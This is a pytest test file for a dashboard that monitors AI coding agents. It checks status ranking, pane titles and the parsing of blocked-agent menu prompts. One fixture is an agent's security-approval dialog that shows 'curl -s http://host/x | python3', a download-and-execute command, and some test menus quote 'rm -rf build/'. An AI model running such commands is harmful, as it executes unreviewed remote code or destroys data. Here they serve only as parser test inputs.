"""Model tests, driven entirely by the captured fixture — no socket, no subprocess."""

import itertools
import json
import re
from pathlib import Path

import pytest
from pydantic import ValidationError

from herdr_pwa.engine import (
    EXPECTED_PROTOCOL,
    Agent,
    AgentStatus,
    BlockedPrompt,
    MenuShape,
    Snapshot,
    rank,
)
from herdr_pwa.engine.model import (
    PaneId,
    Presence,
    SessionId,
    _is_key_hint,  # noqa: PLC2701 - the chrome test is the subject
    as_pane_id,
    as_session_id,
)

FIXTURE = Path(__file__).parent / "fixtures" / "snapshot.example.json"


@pytest.fixture(scope="module")
def raw_snapshot() -> dict:
    payload = json.loads(FIXTURE.read_text())
    return payload["result"]["snapshot"]


@pytest.fixture(scope="module")
def snap(raw_snapshot: dict) -> Snapshot:
    return Snapshot.from_raw(raw_snapshot)


# --- rank ------------------------------------------------------------------


def test_rank_pins_the_full_urgency_order() -> None:
    """Order comes from herdr 0.8.0 semantics, not from lifecycle progress.

    `done` outranks everything but `blocked` because `done` is
    idle-with-unseen-background-work and CLI reads never mark a tab seen, so a
    socket-only dashboard sees it routinely and those are the agents whose output
    nobody has looked at yet.

    `working` above `idle` is deliberate, and it is the correction of a real defect
    rather than a preference: the table used to read idle=2, working=3, so an
    agent doing NOTHING sorted above an agent mid-task in the build on the
    user's phone. Everything doing something or wanting something comes first;
    `idle` is the only known state that is neither, and it sorts last of them.
    """
    assert [rank(s) for s in ("blocked", "done", "working", "idle", "unknown")] == [
        0,
        1,
        2,
        3,
        4,
    ]
    assert rank("done") < rank("working") < rank("idle")


def test_rank_accepts_enum_and_unknown_strings() -> None:
    assert rank(AgentStatus.BLOCKED) == 0
    # A status invented upstream must degrade, not explode.
    assert rank("teleporting") == 4
    assert rank(None) == 4


def test_status_coercion_is_case_insensitive() -> None:
    assert AgentStatus.coerce("BLOCKED") is AgentStatus.BLOCKED
    assert AgentStatus.coerce(" working ") is AgentStatus.WORKING


# --- Agent normalization ---------------------------------------------------


def test_agent_normalizes_the_fixture_fields(raw_snapshot: dict) -> None:
    raw = raw_snapshot["agents"][0]
    workspaces = {w.workspace_id: w for w in Snapshot.from_raw(raw_snapshot).workspaces}
    a = Agent.from_raw(raw, workspaces)
    assert a.target == "w652ae557d5b9c1:p2"
    assert a.session == "5b609dba-d756-493a-a3fc-b4e09bf0a183"
    assert a.title == "Compare the feed with the design rubric"
    assert a.status is AgentStatus.IDLE
    assert a.agent == "claude"
    assert a.cwd == "/home/user/projects/herdr-pwa"
    assert a.workspace == "herdr-pwa"  # joined from workspaces[] by workspace_id
    assert a.workspace_id == "w652ae557d5b9c1"
    assert a.focused is False
    assert a.rank == 3  # idle
    assert a.project == "herdr-pwa"


def test_title_uses_the_stripped_variant(raw_snapshot: dict, snap: Snapshot) -> None:
    # terminal_title carries a spinner/status glyph; the stripped one is the label.
    for agent in snap.agents:
        assert not agent.title.startswith("✳")
    # Stronger: the model reports exactly what the runner stripped, verbatim — it
    # neither falls back to the raw title nor strips anything itself. The fixture
    # contains one agent whose *stripped* title still carries a "◐" glyph, so a
    # local re-strip would silently disagree with the runner.
    expected = {
        a["pane_id"]: a["terminal_title_stripped"] for a in raw_snapshot["agents"]
    }
    assert {a.target: a.title for a in snap.agents} == expected
    assert any(t.startswith("◐") for t in expected.values())


# --- what to call this pane ------------------------------------------------


def _named(**fields: object) -> Agent:
    """One agents[] entry with a generated terminal title and nothing chosen."""
    raw = {
        "pane_id": "w1:p3",
        "terminal_title": "\u25d0 Pane read timings and worktree setup",
        "terminal_title_stripped": "Pane read timings and worktree setup",
    }
    raw.update(fields)  # type: ignore[arg-type]
    return Agent.from_raw(raw)


def test_a_pane_a_human_renamed_is_called_what_they_typed() -> None:
    """`pane rename` writes panes[].label, which only the join can see."""
    snap = Snapshot.from_raw(
        {
            "agents": [
                {
                    "pane_id": "w1:p3",
                    "terminal_title_stripped": "Pane read timings and worktree setup",
                    "name": "orch-herdr-pwa",
                }
            ],
            "panes": [{"pane_id": "w1:p3", "label": "the orchestrator"}],
        }
    )
    assert [a.title for a in snap.agents] == ["the orchestrator"]


def test_the_pane_join_is_by_id_not_position() -> None:
    """Two panes, one label: it must land on the pane that owns it."""
    snap = Snapshot.from_raw(
        {
            "agents": [{"pane_id": "w1:pA"}, {"pane_id": "w1:pB"}],
            "panes": [
                {"pane_id": "w1:pB", "label": "second"},
                {"pane_id": "w1:pA", "label": "first"},
            ],
        }
    )
    assert {a.target: a.title for a in snap.agents} == {
        "w1:pA": "first",
        "w1:pB": "second",
    }


def test_the_shared_title_channel_outranks_the_agent_name() -> None:
    """`report-metadata --title` is the later claim, by a human OR an agent."""
    assert _named(title="what it is doing now", name="job-259").title == (
        "what it is doing now"
    )


def test_a_worker_is_called_by_the_name_it_was_dispatched_under() -> None:
    """The reported cost: every worker has a name and the phone showed none."""
    assert _named(name="job-259").title == "job-259"


def test_a_generated_terminal_title_is_the_last_resort_not_the_first() -> None:
    assert _named().title == "Pane read timings and worktree setup"


def test_a_chosen_name_is_not_worse_for_being_longer() -> None:
    """The trap. min-by-length is the terminal tie-break and stays down there."""
    assert _named(name="job-259 orchestrator for the herdr-pwa backlog").title == (
        "job-259 orchestrator for the herdr-pwa backlog"
    )


def test_the_two_terminal_variants_still_tie_break_by_length() -> None:
    """Unchanged below the fallback: the stripped spelling wins on length."""
    assert _named(terminal_title_stripped=None).title == (
        "\u25d0 Pane read timings and worktree setup"
    )


def test_a_name_that_is_only_whitespace_is_not_a_name() -> None:
    assert _named(label="   ", title="", name="  \t ").title == (
        "Pane read timings and worktree setup"
    )


def test_a_pane_with_no_name_anywhere_is_still_a_card() -> None:
    assert Agent.from_raw({"pane_id": "w9:p1"}).title == ""


def test_the_title_channel_is_read_from_either_array() -> None:
    """It lands in both at once; a snapshot that carries only panes[] still counts."""
    snap = Snapshot.from_raw(
        {
            "agents": [{"pane_id": "w1:p3", "name": "job-259"}],
            "panes": [{"pane_id": "w1:p3", "title": "PROBE-TITLE"}],
        }
    )
    assert [a.title for a in snap.agents] == ["PROBE-TITLE"]


def test_identity_is_the_session_uuid_not_the_pane(
    raw_snapshot: dict, snap: Snapshot
) -> None:
    sessions = [a.session for a in snap.agents]
    assert all(len(s) == 36 for s in sessions)
    assert len(set(sessions)) == len(sessions)
    # Not just "unique and 36 chars": each agent carries *its own* nested
    # agent_session.value, byte for byte. The transcript reader uses this string as a filename
    # (~/.claude/projects/*/<session>.jsonl), so any re-casing or prefixing here
    # silently breaks transcript lookup.
    expected = {
        a["pane_id"]: a["agent_session"]["value"] for a in raw_snapshot["agents"]
    }
    assert {a.target: a.session for a in snap.agents} == expected
    # ...and never the address.
    assert not any(a.session == a.target for a in snap.agents)


def test_workspace_join_is_by_id_not_position(raw_snapshot: dict) -> None:
    shuffled = dict(raw_snapshot)
    shuffled["workspaces"] = list(reversed(raw_snapshot["workspaces"]))
    a = Snapshot.from_raw(shuffled).by_target(PaneId("w1:p3"))
    assert a is not None
    assert a.workspace == "opencode"


def test_agent_tolerates_a_sparse_entry() -> None:
    a = Agent.from_raw({"pane_id": "w9:p1"})
    assert a.target == "w9:p1"
    assert a.session == ""
    assert a.status is AgentStatus.UNKNOWN
    assert a.rank == 4


def test_agent_is_frozen(snap: Snapshot) -> None:
    with pytest.raises(ValidationError):
        snap.agents[0].title = "nope"  # type: ignore


# --- Snapshot --------------------------------------------------------------


def test_snapshot_parses_the_fixture(snap: Snapshot) -> None:
    assert snap.protocol == EXPECTED_PROTOCOL == 22
    assert snap.version == "0.9.0"
    assert len(snap.agents) == 6
    assert len(snap.workspaces) == 5
    assert snap.focused_pane_id == "w1:p3"
    assert snap.protocol_ok is True


def test_agents_come_out_ranked_most_urgent_first(snap: Snapshot) -> None:
    ranks = [a.rank for a in snap.agents]
    assert ranks == sorted(ranks)
    # No blocked or done agent in the fixture, so the working one sorts first
    # and the idle ones follow it (it used to be the other way round).
    assert snap.agents[0].status is AgentStatus.WORKING
    assert snap.agents[-1].status is AgentStatus.IDLE


def test_a_done_agent_sorts_above_the_idle_ones(raw_snapshot: dict) -> None:
    mutated = json.loads(json.dumps(raw_snapshot))
    mutated["agents"][3]["agent_status"] = "done"
    done_target = mutated["agents"][3]["pane_id"]
    s = Snapshot.from_raw(mutated)
    assert s.agents[0].target == done_target


def test_a_blocked_agent_sorts_above_a_working_one(raw_snapshot: dict) -> None:
    mutated = json.loads(json.dumps(raw_snapshot))
    mutated["agents"][-1]["agent_status"] = "blocked"
    blocked_target = mutated["agents"][-1]["pane_id"]
    s = Snapshot.from_raw(mutated)
    assert s.agents[0].target == blocked_target
    assert [a.target for a in s.blocked] == [blocked_target]


def test_sort_is_deterministic_regardless_of_input_order(raw_snapshot: dict) -> None:
    reversed_raw = dict(raw_snapshot, agents=list(reversed(raw_snapshot["agents"])))
    assert [a.target for a in Snapshot.from_raw(reversed_raw).agents] == [
        a.target for a in Snapshot.from_raw(raw_snapshot).agents
    ]


def test_counts_cover_every_status(snap: Snapshot) -> None:
    counts = snap.counts
    assert set(counts) == set(AgentStatus)
    assert counts[AgentStatus.IDLE] == 5
    assert counts[AgentStatus.WORKING] == 1
    assert counts[AgentStatus.BLOCKED] == 0
    assert sum(counts.values()) == len(snap.agents)


def test_lookup_by_session_and_target(snap: Snapshot) -> None:
    a = snap.agents[0]
    assert snap.by_session(a.session) is a
    assert snap.by_target(a.target) is a
    assert snap.by_session(SessionId("00000000-0000-0000-0000-000000000000")) is None
    assert snap.by_target(PaneId("w404:p404")) is None


def test_empty_session_is_a_valid_snapshot_not_an_error() -> None:
    """An idle box is a normal answer, not an error — and the header still renders.

    The bare ``agents == ()`` half of this test was vacuous: it passes for a
    ``from_raw`` whose body is deleted down to ``return cls()``. What actually
    has to hold is that the *rest* of the payload survives an empty agent list
    and that every derived view is still well formed.
    """
    s = Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "version": "0.8.2",
            "agents": [],
            "workspaces": [],
        }
    )
    assert s.agents == ()
    assert s.blocked == ()
    assert s.protocol == EXPECTED_PROTOCOL
    assert s.version == "0.8.2"
    assert s.protocol_ok is True
    assert s.counts == dict.fromkeys(AgentStatus, 0)
    # A missing key is not a crash either: no agents, no workspaces, no join.
    assert Snapshot.from_raw({}).agents == ()


def test_protocol_drift_is_visible_on_the_model() -> None:
    drifted = EXPECTED_PROTOCOL + 1
    s = Snapshot.from_raw({"protocol": drifted, "agents": [], "workspaces": []})
    assert s.protocol_ok is False


# --- BlockedPrompt ---------------------------------------------------------

# Trimmed from a REAL `agent read --source detection --format text` capture of a
# blocked agent on this box, 2026-08-18 (herdr 0.8.0). Note what the live output
# actually looks like: the whole viewport, prior transcript included, a rule
# between question and options, a selection marker on the highlighted option and
# indented description lines under each one. The corpus holds a capture of it.
LIVE_BLOCKED = """\
\u23bf  Backgrounded agent (\u2193 to manage \u00b7 ctrl+o to expand)

\u25cf Five agents are running. Two of the ready tickets touch things outside the repo:
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
\u2190  \u2612 Docs  \u2610 Hooks  \u2714 Submit  \u2192

Hooks: fix provider coverage: opencode is outdated and cursor is not installed,
so status for those agents may be wrong or absent.

\u276f 1. Install both, then verify (Recommended)
     Reinstall opencode to v9 and install the cursor hook.
  2. Claude only \u2014 document the limitation
     Leave the other providers alone entirely.
  3. Just the opencode upgrade
  4. Type something.
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
  5. Chat about this

Enter to select \u00b7 Tab/Arrow keys to navigate \u00b7 Esc to cancel
"""


def test_blocked_prompt_parses_a_real_capture() -> None:
    p = BlockedPrompt.parse(
        LIVE_BLOCKED, target=as_pane_id("w1:p3"), session=as_session_id("sess-1")
    )
    assert p.target == "w1:p3"
    assert p.session == "sess-1"
    assert p.is_choice is True
    # The selection marker is stripped, the indented descriptions are not options,
    # and an option after a divider is still found.
    assert [(o.number, o.label) for o in p.options] == [
        (1, "Install both, then verify (Recommended)"),
        (2, "Claude only \u2014 document the limitation"),
        (3, "Just the opencode upgrade"),
        (4, "Type something."),
        (5, "Chat about this"),
    ]
    # The question is the last paragraph before the options, not the whole viewport.
    assert p.question.startswith("Hooks: fix provider coverage")
    assert "Backgrounded agent" not in p.question
    assert p.raw == LIVE_BLOCKED


def test_an_uncorroborated_numbered_run_is_not_a_menu() -> None:
    """The synthetic fixture that used to drive the safety trade, inverted.

    This text — ``Run `rm -rf build/`? / 1. Yes / 2. No`` — was **invented by an
    implementer**, and it was the whole justification for the permissive branch
    that let a footer-less numbered run become tap targets. The only REAL
    captures we hold all carry a key-hint footer *and* a ❯ marker
    (``tests/fixtures/capture-blocked-*``). Observed evidence beats invented
    evidence when the consequence is a keystroke into a live terminal, so the
    default is flipped: no corroboration, no options.

    The assertion is inverted rather than the test deleted, because the input is
    still worth pinning — it is the exact shape a numbered recap has, and the
    question must still be recovered from it so the card can show what is being
    asked. Only the tap targets go.
    """
    menu = "Run `rm -rf build/`?\n\n1. Yes\n2. No\n"
    p = BlockedPrompt.parse(
        menu, target=as_pane_id("w1:p5"), session=as_session_id("abc")
    )
    assert p.question == "Run `rm -rf build/`?"
    assert p.corroborated is False
    assert p.shape is MenuShape.NONE
    assert p.options == ()
    assert p.is_choice is False


def test_a_footer_alone_no_longer_corroborates_a_run(  # noqa: D103
) -> None:
    """Half of the "either signal" rule is withdrawn, on purpose.

    A key-hint footer says a screen is live. It does not say WHERE the terminal
    would act, and this app addresses a row absolutely -- so a run the terminal
    is not parked in is a run we cannot check our aim against. Relay refuses
    the same way (no marker in the run, no menu, no controls) and never assumes
    the focus is row 0. Every real capture we hold carries the marker; the only
    inputs this costs are ones an implementer wrote.
    """
    menu = "Run `rm -rf build/`?\n\n1. Yes\n2. No\n\nEnter to select · Esc to cancel\n"
    p = BlockedPrompt.parse(menu)
    assert p.options == ()
    assert p.shape is MenuShape.UNKNOWN, "live, and not a menu we can drive"
    assert p.question == "Run `rm -rf build/`?", "still shown, still not tappable"


def test_the_same_menu_with_the_footer_a_real_one_carries_does_parse() -> None:
    """The control for the test above: add what every real capture has, and it parses.

    The earned-shape rule made "what every real capture has" literal: the footer AND the
    marker, which is what all seven `tests/fixtures/capture-blocked-*` draw.
    """
    menu = (
        "Run `rm -rf build/`?\n\n❯ 1. Yes\n  2. No\n\nEnter to select · Esc to cancel\n"
    )
    p = BlockedPrompt.parse(menu)
    assert p.is_choice is True
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert [o.number for o in p.options] == [1, 2]
    # And the keys offered are the ones the footer printed. No digit anywhere.
    assert [(h.key, h.verb) for h in p.hints] == [
        ("enter", "select"),
        ("esc", "cancel"),
    ]


@pytest.mark.parametrize("cursor", ["❯", ">", "▸", "▶", "‣"])
def test_every_cursor_glyph_reads_as_a_menu_row_and_not_only_as_a_cursor(
    cursor: str,
) -> None:
    """`_MARKER_RE` and `_OPTION_RE` must agree on what a cursor looks like.

    Three of these -- ``▸ ▶ ‣`` -- counted as a cursor and NOT as a list marker,
    so ``▸ 1. allow once`` was not an option row. That dropped the cursor row
    out of the run, which made the no-cursor-no-menu rule discard the whole
    menu, on any harness whose cursor is not Claude's. The options then existed
    only in the Pane tab, and the failure named nothing: there was simply no
    menu. herdr's own hermes manifest matches ``[▸>]`` before ``1. allow``,
    which is where these glyphs are attested.
    """
    p = BlockedPrompt.parse(f"Proceed?\n\n{cursor} 1. Yes\n  2. No\n")
    assert [o.number for o in p.options] == [1, 2], "the cursor row is an option"
    assert [o.label for o in p.options] == ["Yes", "No"], "and it is not eaten"
    assert p.corroborated is True
    assert p.shape is MenuShape.SINGLE_CHOICE


HERMES_CLARIFY = (
    "  \u250a \u2753 preparing clarify\u2026\n"
    "\u256d\u2500 Hermes needs your input \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e\n"
    "\u2502 1 questions                            \u2502\n"
    "\u2502 \u25b8 Which database should I migrate first? \u2502\n"
    "\u2502   \u276f 1. users (Recommended)              \u2502\n"
    "\u2502     2. orders                           \u2502\n"
    "\u2502     3. invoices                         \u2502\n"
    "\u2502     4. Other (type your answer)         \u2502\n"
    "\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f\n"
    "\n"
    "  \u2753 clarify  ( 11.0s \u00b7 \u2193 36 tok)\n"
    "  \u2191/\u2193 to select, Enter to lock, Tab next question  (108s)\n"
    " \u2695 GLM-5.3-Flash \u2502 13.7K/1M \u2502 \u25f7 1.3s\n"
    "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
    "? \u276f\n"
    "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
)
"""A real hermes `clarify` dialog, read off the disposable rig.

Kept inline the way every other screen in this file is. Three things about it
are the whole reason `_panel_screen` exists, and none of them are true of any
harness modelled before it: the menu is drawn INSIDE a box, the box sits in the
MIDDLE of the viewport with a tool line, a status bar and a prompt box below it,
and the key hints are under the box rather than at the end of the screen.
"""


def test_a_hermes_clarify_dialog_is_read_and_answerable() -> None:
    """Before `_panel_screen` this parsed to question `'? \u276f'` and no options.

    Every part of that failure was silent: the app offered the generic keypad,
    the options existed only in the Pane tab, and nothing named a box, a border
    or a harness. Reported as "I've seen options in the pane and I had to
    navigate more strangely than I should have".
    """
    p = BlockedPrompt.parse(HERMES_CLARIFY)

    assert [o.number for o in p.options] == [1, 2, 3, 4]
    assert [o.label for o in p.options] == [
        "users (Recommended)",
        "orders",
        "invoices",
        "Other (type your answer)",
    ]
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert p.corroborated is True
    assert "Which database should I migrate first?" in p.question


def test_the_hermes_footer_is_read_through_its_commas() -> None:
    """`\u2191/\u2193 to select, Enter to lock` -- commas separate whole hints here.

    `_KEY_PIECE` splits the KEYS of one hint on commas ("esc, q to cancel"), so
    the line cannot simply be split on them; a comma is only a separator in a
    piece that does not parse without one.
    """
    p = BlockedPrompt.parse(HERMES_CLARIFY)
    assert ("enter", "lock") in [(h.key, h.verb) for h in p.hints]
    assert ("up", "select") in [(h.key, h.verb) for h in p.hints]


def test_a_panel_is_only_the_screen_when_it_holds_a_numbered_run() -> None:
    """A drawn box with no menu in it must not narrow anything."""
    boxed_prose = (
        "\u256d\u2500 Notice \u2500\u2500\u2500\u2500\u2500\u256e\n"
        "\u2502 all done  \u2502\n"
        "\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f\n"
        "\nProceed?\n\n\u276f 1. Yes\n  2. No\n"
    )
    p = BlockedPrompt.parse(boxed_prose)
    assert [o.number for o in p.options] == [1, 2], "the real menu below still wins"


HERMES_APPROVAL = (
    "\u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e\n"
    "\u2502 \u26a0\ufe0f  Dangerous Command          \u2502\n"
    "\u2502                                \u2502\n"
    "\u2502 curl -s http://host/x | python3 \u2502\n"
    "\u2502 \u2026 (choose Show full command)   \u2502\n"
    "\u2502                                \u2502\n"
    "\u2502 \u276f 1. Allow once                \u2502\n"
    "\u2502   2. Allow for this session     \u2502\n"
    "\u2502   3. Add to permanent allowlist \u2502\n"
    "\u2502   4. Deny                       \u2502\n"
    "\u2502   5. Show full command          \u2502\n"
    "\u2502                                \u2502\n"
    "\u2502 Security scan \u2014 [HIGH] Pipe to  \u2502\n"
    "\u2502 interpreter: downloaded content \u2502\n"
    "\u2502 will be executed without review \u2502\n"
    "\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f\n"
    "\n"
    "  \u2191/\u2193 to select, Enter to confirm  (36s)\n"
)
"""hermes's security approval, which is NOT shaped like its clarify dialog.

The options sit in the MIDDLE of the panel with the scan report under them, and
the footer carries a live countdown. Both are real: read off a blocked agent.
"""


def test_options_in_the_middle_of_a_panel_are_still_the_menu() -> None:
    """A dialog may explain itself BELOW its options and still be a dialog.

    `_trailing_menu` wants the run at the end, which inside a drawn panel is too
    strict -- the scan report under the rows is part of the same box. Cutting the
    panel after its last option is what makes the run trailing again, and it is
    done there rather than by relaxing the rule, which still protects a numbered
    recap at the tail of ordinary prose.
    """
    p = BlockedPrompt.parse(HERMES_APPROVAL)

    assert [o.number for o in p.options] == [1, 2, 3, 4, 5]
    assert [o.label for o in p.options][:2] == ["Allow once", "Allow for this session"]
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert p.corroborated is True


def test_a_countdown_after_a_hint_is_not_part_of_its_verb() -> None:
    """`Enter to confirm  (36s)` -- the timer is chrome and broke the whole hint.

    Without the Enter hint the screen names no way for a row to answer, so the
    shape stays UNKNOWN and every option is withheld: an entire dialog lost to a
    ticking clock.
    """
    p = BlockedPrompt.parse(HERMES_APPROVAL)
    assert ("enter", "confirm") in [(h.key, h.verb) for h in p.hints]


def test_a_hint_line_is_not_read_as_one_hint_whose_keys_are_a_verb() -> None:
    """The line matches `_HINT_RE` WHOLE, and that whole match is wrong.

    `keys` swallows "↑/↓ to select, Enter", which reads the first verb as a key
    and loses a hint. Every key piece having to be a real key token is what tells
    that apart from "esc, q to cancel", where the comma is inside one hint.
    """
    both = [(h.key, h.verb) for h in BlockedPrompt.parse(HERMES_APPROVAL).hints]
    assert ("up", "select") in both
    assert ("down", "select") in both
    assert not any(verb != "select" for key, verb in both if key in {"up", "down"})


def test_a_marker_corroborates_a_menu_with_no_footer() -> None:
    """The other positive signal: a terminal only draws a cursor where something is live."""
    p = BlockedPrompt.parse("Proceed?\n\n❯ 1. Yes\n  2. No\n")
    assert p.corroborated is True
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert [o.number for o in p.options] == [1, 2]
    # Nothing was printed, so nothing is offered beyond the generic keypad.
    assert p.hints == ()


def test_blocked_prompt_handles_selection_markers_and_parens() -> None:
    # The question mark is load-bearing now -- a run earns SINGLE_CHOICE
    # by sitting under a question or under an "Enter to select", not by default.
    p = BlockedPrompt.parse("Pick one?\n> 1) alpha\n  2) beta\n")
    assert p.question == "Pick one?"
    assert [(o.number, o.label) for o in p.options] == [(1, "alpha"), (2, "beta")]


def test_free_text_prompt_keeps_the_text_as_the_question() -> None:
    p = BlockedPrompt.parse("What should I name the branch?\n")
    assert p.options == ()
    assert p.is_choice is False
    assert p.question == "What should I name the branch?"


def test_blocked_prompt_on_empty_output_is_harmless() -> None:
    p = BlockedPrompt.parse("")
    assert p.question == ""
    assert p.options == ()


# --- BlockedPrompt: the trailing-menu anchor -------------------------------

# `agent read --source detection` returns the WHOLE viewport, finished
# transcript included. A numbered line anywhere used to start an "options" list,
# so this completed recap became two tap targets and the real question — a
# force-push — was dropped off the end and never shown. Tapping "1" would have
# sent that keystroke to an agent asking about force-pushing to main.
TRANSCRIPT_THEN_QUESTION = (
    "I ran the following steps:\n"
    "1. installed deps\n"
    "2. ran the tests\n"
    "\n"
    "Should I force-push to main?\n"
)


def test_prior_transcript_never_becomes_tap_targets() -> None:
    p = BlockedPrompt.parse(
        TRANSCRIPT_THEN_QUESTION, target=as_pane_id("w1:p3"), session=as_session_id("s")
    )
    assert p.options == ()
    assert p.is_choice is False  # generic keypad, not two wrong buttons
    # And the real question — the one after the numbered recap — is what shows.
    assert p.question == "Should I force-push to main?"
    assert p.raw == TRANSCRIPT_THEN_QUESTION


def test_a_numbered_list_with_no_menu_is_not_a_choice() -> None:
    text = (
        "Here is what I changed:\n"
        "1. bumped the pin\n"
        "2. regenerated the lockfile\n"
        "3. reran the suite\n"
        "\n"
        "All green. Anything else you want me to look at?\n"
    )
    p = BlockedPrompt.parse(text)
    assert p.is_choice is False
    assert p.question == "All green. Anything else you want me to look at?"


def test_options_that_do_not_start_at_one_are_not_a_menu() -> None:
    # A recap that happens to end the viewport, but numbered from 2 — a menu
    # always offers a "1", so this shape is not confidently a menu.
    p = BlockedPrompt.parse("Remaining work:\n2. rebase\n3. push\n")
    assert p.is_choice is False
    assert p.options == ()


def test_a_lone_trailing_number_is_not_a_menu() -> None:
    p = BlockedPrompt.parse("Next up:\n1. rerun the failing test\n")
    assert p.is_choice is False


def test_a_non_numbered_marker_menu_falls_back_to_free_text() -> None:
    # Claude Code also renders yes/no menus with only a ❯ marker and no numbers.
    # There is no keystroke to derive, so do not invent one: show the text and
    # let the generic keypad drive it.
    text = (
        "Do you want to proceed with the migration?\n"
        "❯ Yes\n"
        "  No, tell Claude what to do differently\n"
        "\n"
        "Enter to select · Esc to cancel\n"
    )
    p = BlockedPrompt.parse(text)
    assert p.is_choice is False
    assert p.options == ()
    assert p.question.startswith("Do you want to proceed with the migration?")


def test_a_menu_after_a_numbered_transcript_still_parses() -> None:
    # The hard case: BOTH shapes in one viewport. Only the trailing run counts,
    # and the question is the text right before *it*.
    text = (
        "I ran the following steps:\n"
        "1. installed deps\n"
        "2. ran the tests\n"
        "\n"
        "Should I force-push to main?\n"
        "\n"
        "❯ 1. Yes, force-push\n"
        "  2. No, open a PR instead\n"
        "\n"
        "Enter to select · Esc to cancel\n"
    )
    p = BlockedPrompt.parse(text)
    assert p.is_choice is True
    assert p.question == "Should I force-push to main?"
    assert [(o.number, o.label) for o in p.options] == [
        (1, "Yes, force-push"),
        (2, "No, open a PR instead"),
    ]


def test_menu_is_rejected_when_prose_interrupts_the_run() -> None:
    text = (
        "Pick one:\n"
        "1. keep going\n"
        "That was the plan I had before you interrupted me.\n"
        "2. stop here\n"
    )
    p = BlockedPrompt.parse(text)
    assert p.is_choice is False


# --- identity robustness ---------------------------------------------------


def test_empty_session_never_resolves_to_an_agent() -> None:
    """A sessionless agent must not answer to the empty session.

    ``agent_session`` is absent until the provider emits one, and it normalizes
    to "". ``by_session`` is a linear first-match, so an empty lookup used to
    return whichever sessionless agent sorted first — the wrong-agent failure
    that keying on the session id exists to prevent.
    """
    s = Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "agents": [
                {"pane_id": "w1:p1", "agent_status": "blocked"},
                {"pane_id": "w2:p1", "agent_status": "blocked"},
            ],
            "workspaces": [],
        }
    )
    assert [a.session for a in s.agents] == ["", ""]  # both sessionless
    assert s.by_session(SessionId("")) is None
    assert s.by_session(SessionId("   ")) is None
    assert s.by_target(PaneId("")) is None


def test_a_flattened_agent_session_degrades_instead_of_exploding() -> None:
    """Protocol drift must not raise: a read path that explodes has no fallback.

    A later protocol could flatten ``agent_session`` from {"value": ...} to a
    plain string — the exact drift the protocol guard exists to survive.
    """
    a = Agent.from_raw(
        {"pane_id": "w9:p1", "agent_session": "sess-abc", "agent": "claude"}
    )
    assert a.session == "sess-abc"
    assert a.agent == "claude"


def test_a_nonsense_agent_session_leaves_the_agent_sessionless() -> None:
    for junk in (12345, ["a"], True, None):
        a = Agent.from_raw({"pane_id": "w9:p1", "agent_session": junk})
        assert a.session == ""
        assert a.target == "w9:p1"


def test_whitespace_only_session_normalizes_to_empty() -> None:
    a = Agent.from_raw({"pane_id": "w9:p1", "agent_session": {"value": "   "}})
    assert a.session == ""


# --- normalization: every field, not just the ones that were easy ----------


def test_every_agent_in_the_fixture_is_fully_populated(
    raw_snapshot: dict, snap: Snapshot
) -> None:
    """The count is right and no card would render a hole.

    "Six agents came back" is the weakest possible assertion about
    normalization: a `from_raw` that dropped every join but kept the list length
    would pass it. Assert the whole grid instead.
    """
    assert len(snap.agents) == len(raw_snapshot["agents"]) == 6
    for a in snap.agents:
        assert a.session, "identity is what everything downstream keys on"
        assert a.target, "address is what the runner is driven by"
        assert a.title
        assert a.agent == "claude"
        assert a.cwd.startswith("/")
        assert a.foreground_cwd.startswith("/")
        assert a.workspace, "the workspace label must be joined, not blank"
        assert a.workspace_id
        assert a.workspace_number is not None
        assert a.tab_id
        assert a.project
        assert a.status in set(AgentStatus)
        assert a.revision >= 1


def test_foreground_cwd_falls_back_to_cwd() -> None:
    # The runner omits foreground_cwd when nothing is running in the pane; a
    # blank there would show an empty project on the card.
    a = Agent.from_raw({"pane_id": "w9:p1", "cwd": "/home/user/projects/herdr-pwa"})
    assert a.foreground_cwd == "/home/user/projects/herdr-pwa"
    assert a.project == "herdr-pwa"


def test_the_whole_workspace_join_is_by_id_not_position(raw_snapshot: dict) -> None:
    """Every agent's label *and* number come from its own workspace entry.

    Reversing ``workspaces[]`` is the proof: under a positional join the five
    labels permute, under an id join nothing moves. Checking one agent (as the
    original test did) cannot tell a correct join from one that happens to hit
    the right row.
    """
    by_id = {w["workspace_id"]: w for w in raw_snapshot["workspaces"]}
    expected = {
        a["pane_id"]: (
            by_id[a["workspace_id"]]["label"],
            by_id[a["workspace_id"]]["number"],
        )
        for a in raw_snapshot["agents"]
    }
    assert len(set(expected.values())) > 1  # a positional join would be detectable

    for workspaces in (
        raw_snapshot["workspaces"],
        list(reversed(raw_snapshot["workspaces"])),
    ):
        s = Snapshot.from_raw(dict(raw_snapshot, workspaces=workspaces))
        assert {
            a.target: (a.workspace, a.workspace_number) for a in s.agents
        } == expected


